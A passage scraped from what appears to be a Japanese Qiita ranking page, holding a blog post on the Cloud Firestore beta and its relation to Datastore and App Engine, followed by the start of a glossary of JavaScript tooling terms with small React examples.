		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><a href="https://firebase.google.com/docs/firestore/" rel="nofollow noopener" target="_blank">Cloud Firestore</a> がBetaで公開されました。<br>
Cloud Firestoreは、Firebase Realtime Databaseの後継に当たるサービスです。</p>

<p>Firebase Realtime DBに存在していたリアルタイム更新やデータベースルール, オフライン機能や、Firebase Authとの連携などを受け継いでいます。</p>

<p>大きく変わったのはバックエンドです。<br>
Firebase Realtime DBは、もともとGoogleが作ったものではなく、Googleが買収したサービスでした。<br>
買収後、FirebaseはAuth, Push通知, Analytics, Remote Configなどなど様々な機能が追加されていきましたが、Firebase Realtime DBは抜本的な機能が増えたりすることはありませんでした。</p>

<p>そして、抜本的にUpdateが入ったのが今回のFirestoreです。<br>
バックエンドをGoogle Cloud Datastoreに差し替えて、機能を拡張し、Availabilityを向上させることを狙っています。<br>
たとえば、ソートについてはDatastoreのIndexを利用することで、Firebase Realtime DBと比べてソート条件の選択肢を大幅に増やしています。</p>

<p>さて、そんなFirestoreですが、まだベータで公開されたばかりなので、色々と気を付けることがあります。</p>

<h2>
<span id="cloud-firestoreの始め方" class="fragment"></span><a href="#cloud-firestore%E3%81%AE%E5%A7%8B%E3%82%81%E6%96%B9"><i class="fa fa-link"></i></a>Cloud Firestoreの始め方</h2>

<p><a href="https://console.firebase.google.com/" class="autolink" rel="nofollow noopener" target="_blank">https://console.firebase.google.com/</a> からProjectを作成するか、GCP ProjectのImportを行います。<br>
GCP ProjectをImportする場合、そのProjectがまだApp EngineかDatastoreを利用していない必要があります。</p>

<p><a href="https://camo.qiitausercontent.com/6fdf02d5151dd981a3ea90f8f396d31ac34f1bfd/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353634302f30313065636666662d616665302d656436612d383131662d3930333762373664313865342e706e67" target="_blank" rel="nofollow noopener"><img width="1393" alt="firestore-start.png" src="https://camo.qiitausercontent.com/6fdf02d5151dd981a3ea90f8f396d31ac34f1bfd/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353634302f30313065636666662d616665302d656436612d383131662d3930333762373664313865342e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15640/010ecfff-afe0-ed6a-811f-9037b76d18e4.png"></a></p>

<p>DatabaseメニューからFirestoreを選択すると、Firestoreを利用できます。<br>
もし、すでにApp Engine or Datastoreを利用している場合は以下のようにエラーになります。</p>

<p><a href="https://camo.qiitausercontent.com/579aef5f724378da3b50a60b41eb49f9cba1f490/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353634302f65653930313866332d303134642d613030622d373334302d3061353738643339313163302e706e67" target="_blank" rel="nofollow noopener"><img width="675" alt="sinmetal-firestore-2_–_Database_–_Firebase_console.png" src="https://camo.qiitausercontent.com/579aef5f724378da3b50a60b41eb49f9cba1f490/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353634302f65653930313866332d303134642d613030622d373334302d3061353738643339313163302e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15640/ee9018f3-014d-a00b-7340-0a578d3911c0.png"></a></p>

<p>あとはドキュメントに従って、好きなクライアントから呼び出せばOKです。<br>
データを入れると以下のような感じで見えます。</p>

<p><a href="https://camo.qiitausercontent.com/ac9199bd05a3803c7a42c75e82fdb136d7d0e06b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353634302f64663564346263632d343230372d666366322d303533372d6238316232646435313239632e706e67" target="_blank" rel="nofollow noopener"><img width="1127" alt="firestore-console.png" src="https://camo.qiitausercontent.com/ac9199bd05a3803c7a42c75e82fdb136d7d0e06b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353634302f64663564346263632d343230372d666366322d303533372d6238316232646435313239632e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15640/df5d4bcc-4207-fcf2-0537-b81b2dd5129c.png"></a></p>

<h2>
<span id="datastoreとの関係" class="fragment"></span><a href="#datastore%E3%81%A8%E3%81%AE%E9%96%A2%E4%BF%82"><i class="fa fa-link"></i></a>Datastoreとの関係</h2>

<p>Firestoreは、Firebase Realtime DBの後継として登場したわけですが、Firestoreを有効にしているGCP ProjectのDatastoreのConsoleを表示すると以下のような画面が出てきて、DatastoreのConsoleを利用することはできません。</p>

<p><a href="https://camo.qiitausercontent.com/e67b4ef0d8ed16cdd0bfa8dd35760ad8d2d4c09f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353634302f35333164643363622d386162362d383436642d386637642d6162623938626262386166342e706e67" target="_blank" rel="nofollow noopener"><img width="691" alt="datastore.png" src="https://camo.qiitausercontent.com/e67b4ef0d8ed16cdd0bfa8dd35760ad8d2d4c09f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353634302f35333164643363622d386162362d383436642d386637642d6162623938626262386166342e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15640/531dd3cb-8ab6-846d-8f7d-abb98bbb8af4.png"></a></p>

<p>そして、この画面のメッセージには、Firestoreは <strong>Datastoreの後継</strong> だと書かれています。<br>
確かに、FirestoreはDatastoreの機能をほぼすべて受け継いだ上で、追加の機能を足しているような状態になっています。<br>
まだ、ベータ公開されたばかりなので、荒削りなところはありますが、Datastore使いから見ても魅力的なサービスです。</p>

<h3>
<span id="firestoreとdatastoreの併用" class="fragment"></span><a href="#firestore%E3%81%A8datastore%E3%81%AE%E4%BD%B5%E7%94%A8"><i class="fa fa-link"></i></a>FirestoreとDatastoreの併用</h3>

<p>Firestoreを利用していると、DatastoreのConsoleは使えないのですが、後ろではDatastoreを利用しているので、DatastoreのAPIを利用して、データを登録しても、Firestoreに反映されます。<br>
そのため、 <a href="https://cloud.google.com/dataflow/?hl=ja" rel="nofollow noopener" target="_blank">Google Cloud Dataflow</a> のDatastore IOを利用して、データの読み書きを行うことができます。<br>
初期データの投入なんかはDataflowから行うのが簡単です。</p>

<h2>
<span id="app-engineとfirestore" class="fragment"></span><a href="#app-engine%E3%81%A8firestore"><i class="fa fa-link"></i></a>App EngineとFirestore</h2>

<p>App Engineをすでに利用しているGCP ProjectではFirestoreを使えませんが、Firestoreを初めてから、App EngineをDeployすることは可能です。<br>
この場合、App Engineは <code>us-central-1</code> となります。App Engine &amp; Cloud Datastoreはすでに <code>asia-northeast-1</code> にいるわけですが、おそらくFirestoreは現状USにしかいないのでしょう。<br>
GAになるころには、 <code>asia-northeast-1</code> に来るように信仰心が試されます。</p>

<p>App EngineからFirestoreを使う方法ですが、２種類あります。<br>
1つはFirestoreだと思わずに、普通にApp EngineにビルトインされているDatastore Libraryを利用してアクセスします。<br>
Firestoreは普通にDatastoreにデータを入れているので、普通に読み書きできます。<br>
もう1つはFirestoreのLibraryを利用する方法です。<br>
<a href="https://cloud.google.com/firestore/docs/apis" rel="nofollow noopener" target="_blank">Cloud Client Library</a> が用意されているので、これを利用します。<br>
オフラインDBや、リアルタイム同期などのサポートはApp Engine Standardでは利用できませんが、普通に読み書きするのは可能です。<br>
ただ、App Engine StandardでCloud Client Libraryを利用した場合、後ろではgRPCを利用します。<br>
gPRCを利用する時に、App Engine Socket APIを利用するので、Quotaに注意が必要です。</p>

<p>どちらの方法でも、App EngineからFirestoreを利用した場合、App EngineのConsoleからはFirestoreとして表示されます。<br>
現在、Firestoreの料金体系はDatastoreと同じような感じです。 <br>
なぜかFirestoreには、Datastore Small Ops相当のものが書いてないのが、ちょっと気になるぐらいです。</p>

<ul>
<li><a href="https://cloud.google.com/firestore/pricing" class="autolink" rel="nofollow noopener" target="_blank">https://cloud.google.com/firestore/pricing</a></li>
<li><a href="https://cloud.google.com/datastore/pricing" class="autolink" rel="nofollow noopener" target="_blank">https://cloud.google.com/datastore/pricing</a></li>
</ul>

<p><a href="https://camo.qiitausercontent.com/de2cc68a299c71948b59ed7629e453ab09092800/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353634302f62343462383133322d383436362d393866612d323566662d6363363231353738343935332e706e67" target="_blank" rel="nofollow noopener"><img width="1487" alt="App_Engine_Dashboard_-_sinmetal-firestore-3.png" src="https://camo.qiitausercontent.com/de2cc68a299c71948b59ed7629e453ab09092800/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353634302f62343462383133322d383436362d393866612d323566662d6363363231353738343935332e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15640/b44b8132-8466-98fa-25ff-cc6215784953.png"></a></p>

<h2>
<span id="現時点での課題" class="fragment"></span><a href="#%E7%8F%BE%E6%99%82%E7%82%B9%E3%81%A7%E3%81%AE%E8%AA%B2%E9%A1%8C"><i class="fa fa-link"></i></a>現時点での課題</h2>

<p>さて、ベータなので、やっぱり課題はまだまだあります。<br>
現時点で僕が一番感じている問題は <strong>パフォーマンスが悪い</strong> です。<br>
おそらく、FirestoreのAPIを受け取っている何かがDatastoreとやりとりしてるんじゃないかと思ってるんですが、ぼちぼち遅いです。<br>
まぁ、Datastore自体がそんなに1回ずつのやり取りが早いDatabaseじゃないので、びびるレベルで早くするのは難しいような気はちょっとしてるけど、それにしてもちょっと遅くない！？みたいなところが少しあります。<br>
実際、App Engine Standard for GoからビルトインのDatastoreを呼ぶと50ms ~ 100msぐらいですが、Firestoreを呼ぶと200ms ~ 4500msぐらいかかっています。<br>
Socket APIが間に入っているとは言え、さすがに1件putに4500msは遅くない！？みたいな気持ちです。<br>
だんだん早くなっていってくれるのを祈る or 早くやり取りできるデータ構成を考える 必要がありそうな感じです。</p>

<p>Datastoreとの併用については、将来的にはできるようにするみたいなことを言ってたという噂を聞いたので、FirestoreがDatastoreをガッと奪っている感じにベータの間だけで、将来的には1つのGCP Projectで同居できるようになりそうです。</p>

<h2>
<span id="さいごに" class="fragment"></span><a href="#%E3%81%95%E3%81%84%E3%81%94%E3%81%AB"><i class="fa fa-link"></i></a>さいごに</h2>

<p>Datastoreジャンキーの僕としてはFirestoreは非常に期待しているサービスです。<br>
Firebase Realtime DBは便利なサービスですが、Availabilityの問題やGCPのサービスたちとの連携に少々課題がありましたが、Firestoreはそれを解決してくれるぴったりなサービスです。<br>
Datastoreを使うのをやめて、Firestoreを使うようにするような世界がいつ来るかは分かりませんが、これからはそれも頭の片隅においてアーキテクチャを考えていこうかなと思います。</p>

<p>現時点のFirestoreでのアーキテクチャを理解するためには、Datastoreを理解する必要があり、Datastoreを理解するためにはBigtableを理解する必要があるみたいなところが、ちょっとあるかもしれない。<br>
その辺りもいずれ書けたら書こう。</p>

<p>Cloud Firestoreに興味がある人は、 GCPUGのSlackの <code>#c-firestore_ja</code> でコミュニティのメンバーがうだうだ言ってるので、参加してみるとよいかも。<br>
GCPUG Slackへは <a href="http://gcpug.jp/join" class="autolink" rel="nofollow noopener" target="_blank">http://gcpug.jp/join</a> にあるFormから参加できます。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">84位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>109</kbd>
		<a target="_blank" href="https://qiita.com/tomoyamachi/items/b398f35882fb57b975ad">2017年のJavaScript開発で知っておきたい用語集/リンク集</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-31<br />07:54:26</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/14275.html">tomoyamachi</a>(31件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/14275/profile-images/1473683263">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[初心者]</b> <b>[フロントエンド]</b> <b>[React]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>JavaScriptを本格的に学ばねばならぬときがきたので、よく知らなかった用語を調べた。<br>
基本的に大項目のリンク先は公式ページ。参考記事は詳細に別途リンクを貼る。<br>
HOTなツールを知りたいときは<a href="https://risingstars2016.js.org/" rel="nofollow noopener" target="_blank">2016 JavaScript Rising Stars</a>を見るとよさそう。</p>

<h1>
<span id="更新履歴" class="fragment"></span><a href="#%E6%9B%B4%E6%96%B0%E5%B1%A5%E6%AD%B4"><i class="fa fa-link"></i></a>更新履歴</h1>

<ul>
<li>2017/10/31 11:00 : <a href="%E3%81%9D%E3%81%AE%E4%BB%96%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA">その他ライブラリ</a>の項を追加</li>
<li>2017/10/31 12:00 : ECMAScriptの説明を大幅に修正</li>
<li>2017/10/31 23:00 : <a href="#css%E9%96%A2%E9%80%A3%E3%81%AEloader">CSS関連のLoader</a>, <a href="#%E9%96%8B%E7%99%BA%E3%81%AB%E4%BE%BF%E5%88%A9%E3%81%AA%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA">開発に便利なライブラリ</a>を追加</li>
</ul>

<h1>
<span id="基本用語" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E8%AA%9E"><i class="fa fa-link"></i></a>基本用語</h1>

<h2>
<span id="nodejs" class="fragment"></span><a href="#nodejs"><i class="fa fa-link"></i></a><a href="https://nodejs.org/en/" rel="nofollow noopener" target="_blank">Node.js</a>
</h2>

<ul>
<li>ネットワークアプリケーションを作成するためのJavaScript実行環境</li>
<li>非同期型のイベント駆動</li>
</ul>

<h2>
<span id="nvm-node-version-manager" class="fragment"></span><a href="#nvm-node-version-manager"><i class="fa fa-link"></i></a><a href="https://github.com/creationix/nvm" rel="nofollow noopener" target="_blank">nvm (Node Version Manager)</a>
</h2>

<ul>
<li>Node.jsのバージョン管理システム</li>
</ul>

<h2>
<span id="v8-google-v8-javascript-engine" class="fragment"></span><a href="#v8-google-v8-javascript-engine"><i class="fa fa-link"></i></a><a href="https://developers.google.com/v8/" rel="nofollow noopener" target="_blank">V8 (Google V8 JavaScript Engine)</a>
</h2>

<ul>
<li>Googleが開発しているJavaScriptエンジン</li>
<li>C++ベースでGoogle Chromeやnode.jsに使われている</li>
</ul>

<h2>
<span id="ecmascriptes" class="fragment"></span><a href="#ecmascriptes"><i class="fa fa-link"></i></a><a href="http://www.ecmascript.org/" rel="nofollow noopener" target="_blank">ECMAScript(ES)</a>
</h2>

<ul>
<li>JavaScriptの標準言語仕様</li>
<li>最新はECMAScript® 2017(ECMA-262 8th edition) <del>ES8</del>
</li>
<li><del>バージョンは発表された西暦を使う場合と、発表ごとの連番を使う場合がある</del></li>
<li>
<del>ES2015以降はサポートしていないブラウザが多い</del> <sup id="fnref1"><a href="#fn1" rel="footnote" title="@erukiti さんのご指摘により大幅に修正">1</a></sup>
</li>
<li>ブラウザへの対応状況は<a href="http://kangax.github.io/compat-table/es6/" rel="nofollow noopener" target="_blank">ここで確認できる</a>
</li>
<li>「エクマスクリプト」と読む</li>
</ul>

<h2>
<span id="commonjs" class="fragment"></span><a href="#commonjs"><i class="fa fa-link"></i></a><a href="http://www.commonjs.org/" rel="nofollow noopener" target="_blank">CommonJS</a>
</h2>

<ul>
<li>ウェブブラウザ環境外におけるJavaScriptの各種仕様を定めることを目標としたプロジェクト - <a href="https://ja.wikipedia.org/wiki/CommonJS" rel="nofollow noopener" target="_blank">wikipedia</a>
</li>
<li>さまざまなツールの基盤になってはいるが、いまの重要度は低そう</li>
</ul>

<h2>
<span id="spasingle-page-application" class="fragment"></span><a href="#spasingle-page-application"><i class="fa fa-link"></i></a>SPA(Single-page Application)</h2>

<ul>
<li>1枚のHTML+必要なアセット(JavaScript/CSS etc)で動作する</li>
<li>ページのリロードが発生しない</li>
</ul>

<p><br></p>

<h1>
<span id="パッケージ管理" class="fragment"></span><a href="#%E3%83%91%E3%83%83%E3%82%B1%E3%83%BC%E3%82%B8%E7%AE%A1%E7%90%86"><i class="fa fa-link"></i></a>パッケージ管理</h1>

<p>参考 : <a href="https://www.webprofessional.jp/yarn-vs-npm/" rel="nofollow noopener" target="_blank">Yarn：Facebook発のパッケージマネジャーはnpmに代わるスタンダードになるか</a></p>

<h2>
<span id="npm-node-package-manager" class="fragment"></span><a href="#npm-node-package-manager"><i class="fa fa-link"></i></a><a href="https://www.npmjs.com/" rel="nofollow noopener" target="_blank">npm (Node Package Manager)</a>
</h2>

<ul>
<li>Node.jsでつくられたパッケージの管理システム</li>
<li>Node.jsをインストールすると標準でついてくる</li>
</ul>

<h2>
<span id="yarn" class="fragment"></span><a href="#yarn"><i class="fa fa-link"></i></a><a href="https://yarnpkg.com/en/" rel="nofollow noopener" target="_blank">Yarn</a>
</h2>

<ul>
<li>Facebook, Googleなどが開発したパッケージ管理システム</li>
<li>npmの課題を解決してある

<ul>
<li>lockファイルの作成</li>
<li>並行ダウンロード</li>
</ul>
</li>
</ul>

<h2>
<span id="packagejson" class="fragment"></span><a href="#packagejson"><i class="fa fa-link"></i></a>package.json</h2>

<ul>
<li>npm/Yarnで管理するパッケージリストを記載したファイル</li>
<li>同じ書式で利用可能</li>
<li>
<a href="https://docs.npmjs.com/files/package.json" rel="nofollow noopener" target="_blank">npm仕様</a>/<a href="https://yarnpkg.com/en/docs/package-json#search" rel="nofollow noopener" target="_blank">Yarn仕様</a>
</li>
</ul>

<p><br></p>

<h1>
<span id="モジュールバンドラ" class="fragment"></span><a href="#%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%83%90%E3%83%B3%E3%83%89%E3%83%A9"><i class="fa fa-link"></i></a>モジュールバンドラ</h1>

<p>参考ページ : <a href="https://www.slant.co/topics/1089/versus/%7Ewebpack_vs_browserify_vs_rollup-js" rel="nofollow noopener" target="_blank">What are the best client-side JavaScript module loaders?</a></p>

<h2>
<span id="webpack" class="fragment"></span><a href="#webpack"><i class="fa fa-link"></i></a><a href="https://webpack.js.org/" rel="nofollow noopener" target="_blank">Webpack</a>
</h2>

<ul>
<li>コード分割ができる</li>
<li>柔軟性が高い</li>
<li>最近はこちらがスタンダード</li>
</ul>

<h2>
<span id="browserify" class="fragment"></span><a href="#browserify"><i class="fa fa-link"></i></a><a href="http://browserify.org/" rel="nofollow noopener" target="_blank">Browserify</a>
</h2>

<ul>
<li>シンプルな構成</li>
<li>CommonJSモジュールをブラウザ用にコンパイルする</li>
<li>最近はこちらに対応していないモジュールも出てきている</li>
</ul>

<p><br></p>

<h1>
<span id="ライブラリフレームワーク" class="fragment"></span><a href="#%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%83%AF%E3%83%BC%E3%82%AF"><i class="fa fa-link"></i></a>ライブラリ/フレームワーク</h1>

<p>参考 : <a href="https://hackernoon.com/5-best-javascript-frameworks-in-2017-7a63b3870282" rel="nofollow noopener" target="_blank">https://hackernoon.com/5-best-javascript-frameworks-in-2017-7a63b3870282</a></p>

<h2>
<span id="reactjs" class="fragment"></span><a href="#reactjs"><i class="fa fa-link"></i></a><a href="https://reactjs.org/" rel="nofollow noopener" target="_blank">React.js</a>
</h2>

<ul>
<li>Facebook製のJSライブラリ</li>
<li>大規模開発で思い入れがないなら、これを選ぶとよいと言われた</li>
<li>Reduxと併用すると、stateの管理が楽と聞いた</li>
</ul>

<h2>
<span id="vuejs" class="fragment"></span><a href="#vuejs"><i class="fa fa-link"></i></a><a href="https://jp.vuejs.org/" rel="nofollow noopener" target="_blank">Vue.js</a>
</h2>

<ul>
<li>オープンソースなJSライブラリ</li>
<li>学習コストは低く、少しづつ導入していくときに良さそう</li>
<li>大規模プロジェクトだと管理しづらくなると聞いた</li>
</ul>

<h2>
<span id="angularjs--angular旧angular2" class="fragment"></span><a href="#angularjs--angular%E6%97%A7angular2"><i class="fa fa-link"></i></a><a href="https://angular.io/" rel="nofollow noopener" target="_blank">AngularJS</a> / <a href="https://angular.io/" rel="nofollow noopener" target="_blank">Angular(旧Angular2)</a>
</h2>

<ul>
<li>Google製のJSフレームワーク</li>
<li>1も2も学習コストが高いと聞く</li>
<li>1と2は設計からして別物と聞いた</li>
</ul>

<h2>
<span id="emberjs" class="fragment"></span><a href="#emberjs"><i class="fa fa-link"></i></a><a href="https://emberjs.com/" rel="nofollow noopener" target="_blank">Ember.js</a>
</h2>

<ul>
<li>少し前に大流行したフレームワーク</li>
<li>学習コストが高いと聞いた</li>
<li>規約による制限は強いが、慣れれば使いやすいと聞いた</li>
</ul>

<p><br></p>

<h1>
<span id="コンパイラトランスパイラ" class="fragment"></span><a href="#%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%A9%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B9%E3%83%91%E3%82%A4%E3%83%A9"><i class="fa fa-link"></i></a>コンパイラ/トランスパイラ</h1>

<h2>
<span id="babel" class="fragment"></span><a href="#babel"><i class="fa fa-link"></i></a><a href="https://babeljs.io/" rel="nofollow noopener" target="_blank">Babel</a>
</h2>

<ul>
<li>JavaScriptのコンパイラ ※以前はtranspilerだった気がする</li>
<li>まだブラウザが対応していない標準言語仕様で記載しても、動くコードを吐き出してくれる</li>
<li>そのため、ブラウザが対応してくれるようになれば、書いたコードをそのまま使えばよいだけになる</li>
</ul>

<h2>
<span id="typescript" class="fragment"></span><a href="#typescript"><i class="fa fa-link"></i></a><a href="https://www.typescriptlang.org/" rel="nofollow noopener" target="_blank">TypeScript</a>
</h2>

<ul>
<li>Microsoftが開発</li>
<li>静的型付けができる</li>
<li>JavaScriptにコンパイルできる</li>
</ul>

<h2>
<span id="coffeescript" class="fragment"></span><a href="#coffeescript"><i class="fa fa-link"></i></a><a href="http://coffeescript.org/" rel="nofollow noopener" target="_blank">CoffeeScript</a>
</h2>

<ul>
<li>JavaScript/JSXにコンパイルできる言語</li>
<li>Ruby/Pythonっぽい記法</li>
</ul>

<p><br></p>

<h1>
<span id="react関連用語" class="fragment"></span><a href="#react%E9%96%A2%E9%80%A3%E7%94%A8%E8%AA%9E"><i class="fa fa-link"></i></a>React関連用語</h1>

<h2>
<span id="redux" class="fragment"></span><a href="#redux"><i class="fa fa-link"></i></a><a href="http://redux.js.org/" rel="nofollow noopener" target="_blank">Redux</a>
</h2>

<ul>
<li>JavaScriptの状態を管理するフレームワーク</li>
<li>Fluxの考え方をベースにつくられている</li>
<li>以下の5要素で構成される

<ul>
<li>State : アプリケーションの状態</li>
<li>Store : Stateを一元管理する場所</li>
<li>Reducer : StoreにあるStateを変更し、新しいStateを返す。Actionをもとに起動する。</li>
<li>Action : Stateを変更する際に一番最初に発火する。Reducerに働きかける</li>
<li>ActionCreator : Actionを作るとき便利に呼び出しやすくするためのもの</li>
</ul>
</li>
<li>参考 : <a href="https://qiita.com/kiita312/items/49a1f03445b19cf407b7" id="reference-6bea2aaeb2f5da51e3de">Redux入門【ダイジェスト版】10分で理解するReduxの基礎</a>
</li>
</ul>

<h2>
<span id="flux" class="fragment"></span><a href="#flux"><i class="fa fa-link"></i></a><a href="https://facebook.github.io/flux/" rel="nofollow noopener" target="_blank">Flux</a>
</h2>

<ul>
<li>アプリケーションのデータ管理パターン</li>
<li>データが単一の方向に流れる</li>
</ul>

<h2>
<span id="element-react" class="fragment"></span><a href="#element-react"><i class="fa fa-link"></i></a><a href="https://reactjs.org/docs/rendering-elements.html" rel="nofollow noopener" target="_blank">Element (React)</a>
</h2>

<ul>
<li>Reactのアプリケーションを構成する最小要素</li>
<li>ReactDOMという、オブジェクトでできている</li>
</ul>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">element</span> <span class="o">=</span> <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Hello</span><span class="p">,</span> <span class="nx">world</span><span class="o">&lt;</span><span class="err">/h1&gt;;</span>
</pre></div></div>

<h2>
<span id="component-react" class="fragment"></span><a href="#component-react"><i class="fa fa-link"></i></a><a href="https://reactjs.org/docs/components-and-props.html" rel="nofollow noopener" target="_blank">Component (React)</a>
</h2>

<ul>
<li>関数のようなもの</li>
<li>入力(props)に対して、画面に表示するElementを返す</li>
</ul>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">Welcome</span><span class="p">(</span><span class="nx">props</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Hello</span><span class="p">,</span> <span class="p">{</span><span class="nx">props</span><span class="p">.</span><span class="nx">name</span><span class="p">}</span><span class="o">&lt;</span><span class="err">/h1&gt;;</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="jsx" class="fragment"></span><a href="#jsx"><i class="fa fa-link"></i></a><a href="https://reactjs.org/docs/glossary.html#jsx" rel="nofollow noopener" target="_blank">JSX</a>
</h2>

<ul>
<li>XMLのような構文をサポートした拡張言語</li>
<li>DOMの設計を理解しやすい</li>
<li>Reactで利用する</li>
</ul>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="s1">'Clementine'</span><span class="p">;</span>
<span class="nx">ReactDOM</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span>
  <span class="o">&lt;</span><span class="nx">h1</span> <span class="nx">className</span><span class="o">=</span><span class="s2">"hello"</span><span class="o">&gt;</span><span class="nx">My</span> <span class="nx">name</span> <span class="nx">is</span> <span class="p">{</span><span class="nx">name</span><span class="p">}</span><span class="o">!&lt;</span><span class="err">/h1&gt;,</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'root'</span><span class="p">)</span>
<span class="p">);</span>
</pre></div></div>

<h2>
<span id="仮想domvirtual-dom" class="fragment"></span><a href="#%E4%BB%AE%E6%83%B3domvirtual-dom"><i class="fa fa-link"></i></a>仮想DOM(Virtual DOM)</h2>

<ul>
<li>実際のDOMを直接操作しない</li>
<li>操作した状態のDOM情報をオブジェクトとして持ち、実際のDOMに対し、差分のパッチを当てることでDOMを描画する</li>
<li>参考 : <a href="http://postd.cc/the-inner-workings-of-virtual-dom/" rel="nofollow noopener" target="_blank">仮想DOMの内部の動き</a>
</li>
</ul>

<h2>
<span id="ミドルウェア-redux" class="fragment"></span><a href="#%E3%83%9F%E3%83%89%E3%83%AB%E3%82%A6%E3%82%A7%E3%82%A2-redux"><i class="fa fa-link"></i></a>ミドルウェア (Redux)</h2>

<ul>
<li>Reduxの拡張ではミドルウェアの使用が推奨される</li>
</ul>

<h3>
<span id="redux-thunk" class="fragment"></span><a href="#redux-thunk"><i class="fa fa-link"></i></a><a href="https://github.com/gaearon/redux-thunk" rel="nofollow noopener" target="_blank">redux-thunk</a>
</h3>

<ul>
<li>引数としてディスパッチを渡し、Reduxに非同期処理を持ち込む</li>
<li>
<a href="http://redux.js.org/docs/api/applyMiddleware.html" rel="nofollow noopener" target="_blank">公式でも言及されている</a>ミドルウェア</li>
</ul>

<p><br></p>

<h1>
<span id="テストツール" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88%E3%83%84%E3%83%BC%E3%83%AB"><i class="fa fa-link"></i></a>テストツール</h1>

<p>参考 : <a href="https://medium.com/powtoon-engineering/a-complete-guide-to-testing-javascript-in-2017-a217b4cd5a2a" rel="nofollow noopener" target="_blank">An Overview of JavaScript Testing in 2017<br>
</a></p>

<h2>
<span id="jest" class="fragment"></span><a href="#jest"><i class="fa fa-link"></i></a><a href="https://facebook.github.io/jest/" rel="nofollow noopener" target="_blank">Jest</a>
</h2>

<ul>
<li>Facebook製。Reactのテストはこれを使っている<a href="/Facebook" class="user-mention js-hovercard" title="Facebook" data-hovercard-target-type="user" data-hovercard-target-name="Facebook">@Facebook</a>
</li>
<li>変更した際の差分をテストするので大規模プロジェクトでも高速</li>
<li>スナップショットテストもできる</li>
</ul>

<h2>
<span id="ava" class="fragment"></span><a href="#ava"><i class="fa fa-link"></i></a><a href="https://github.com/avajs/ava" rel="nofollow noopener" target="_blank">AVA</a>
</h2>

<ul>
<li>テストを並列で実行することで高速化</li>
<li>シンプルな構成</li>
<li>スナップショットテストもできる</li>
</ul>

<h2>
<span id="jasmine" class="fragment"></span><a href="#jasmine"><i class="fa fa-link"></i></a><a href="https://jasmine.github.io/" rel="nofollow noopener" target="_blank">Jasmine</a>
</h2>

<ul>
<li>BDD(ふるまい駆動開発)</li>
<li>必要なものはあるていど揃っている</li>
</ul>

<h2>
<span id="mocha" class="fragment"></span><a href="#mocha"><i class="fa fa-link"></i></a><a href="https://mochajs.org/" rel="nofollow noopener" target="_blank">Mocha</a>
</h2>

<ul>
<li>柔軟性が高く、よく利用されるツール</li>
<li>外部のツールなどを利用するので複雑になりやすい</li>
</ul>

<h2>
<span id="enzyme" class="fragment"></span><a href="#enzyme"><i class="fa fa-link"></i></a><a href="http://airbnb.io/enzyme/" rel="nofollow noopener" target="_blank">enzyme</a>
</h2>

<ul>
<li>AirBnB製。React用のテストユーティリティライブラリ</li>
<li>テストが格段に書きやすくなる</li>
<li>他のツールと組み合わせて利用する</li>
</ul>

<h2>
